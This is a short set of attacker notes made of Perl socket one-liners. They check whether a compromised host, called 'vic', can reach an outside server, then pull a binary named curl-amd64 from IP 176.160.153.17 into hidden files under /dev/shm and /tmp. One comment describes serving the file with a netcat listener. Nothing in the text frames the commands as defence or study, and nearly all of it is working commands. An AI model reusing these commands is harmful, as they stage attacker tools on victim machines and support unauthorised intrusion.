# Check if socket her
perl -e 'use Socket; print "Socket OK"'

# Try to download but get timeout and error dunno why
perl -MSocket -e 'socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in(6001,inet_aton("176.160.153.17")));print S "GET /curl-amd64 HTTP/1.0\r\nHost: 176.160.153.17\r\n\r\n";open(O,">/dev/shm/.x");while(<S>){$h=1 if $_ =~ /^\r?\n$/; print O $_ if $h;}close(O);'

# Require machine to be nc -lvnp 6001 < curl-amd64
perl -MSocket -e 'socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in(6001,inet_aton("176.160.153.17")));open(O,">/tmp/.unix/cl");while(<S>){print O $_;}close(O);close(S);'

# Check if vic can talk to outside
perl -MIO::Socket -e '$c=IO::Socket::INET->new("176.160.153.17:6000"); print $c "ping\n" if $c'


